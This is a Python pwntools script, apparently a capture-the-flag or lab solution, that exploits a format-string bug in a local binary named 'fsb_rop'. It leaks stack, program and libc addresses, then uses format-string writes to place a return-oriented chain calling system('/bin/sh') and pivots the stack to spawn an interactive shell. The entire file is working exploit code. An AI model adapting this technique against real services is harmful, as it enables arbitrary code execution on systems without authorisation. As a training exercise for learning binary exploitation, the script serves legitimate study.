import os
import time

import pwn

script_dir = os.path.dirname(os.path.realpath(__file__))
elf_path = os.path.join(script_dir, "./fsb_rop")
libc_path = os.path.join(script_dir, "./../.lib/libc.so.6")


def write_with_fsb(io, addr, value):
    payload = pwn.fmtstr_payload(6, {addr: value}, write_size="short")
    print(f"%n FSB payload: {payload}")
    io.sendline(payload)
    time.sleep(0.2)


def exploit(io, elf, libc):
    io.sendline(b"%4$lx:%17$lx:%21$lx")
    stack_addr, main_37, __libc_start_main_234 = map(
        lambda x: int(x, 16), io.recvline().split(b":")
    )
    __libc_start_main_ofs = 0x26C20

    elf.address = main_37 - 37 - elf.sym.main
    libc.address = __libc_start_main_234 - __libc_start_main_ofs - 234
    print(f"elf - base_addr: {hex(elf.address)}")
    print(f"libc - base_addr: {hex(libc.address)}")

    pop_rdi = elf.address + 0x1273
    leave_ret = elf.sym.main + 62
    binsh = next(libc.search(b"/bin/sh\x00"))

    vuln_return_addr = stack_addr + 88
    printf_return_addr = stack_addr - 8
    print(f"stack - vuln_return_addr: {hex(vuln_return_addr)}")
    print(f"stack - printf_return_addr: {hex(printf_return_addr)}")

    write_with_fsb(io, addr=vuln_return_addr, value=pop_rdi)  # pop rdi ; ret
    write_with_fsb(io, addr=vuln_return_addr + 0x8, value=binsh)
    write_with_fsb(io, addr=vuln_return_addr + 0x10, value=libc.sym.system)
    write_with_fsb(io, addr=printf_return_addr, value=leave_ret)  # leave ; ret

    io.clean()


def main():
    elf = pwn.context.binary = pwn.ELF(elf_path)
    libc = pwn.ELF(libc_path)
    if pwn.args.GDB:
        io = pwn.gdb.debug(elf.path)
    else:
        io = pwn.process(elf.path)

    exploit(io, elf, libc)
    io.interactive()


if __name__ == "__main__":
    main()
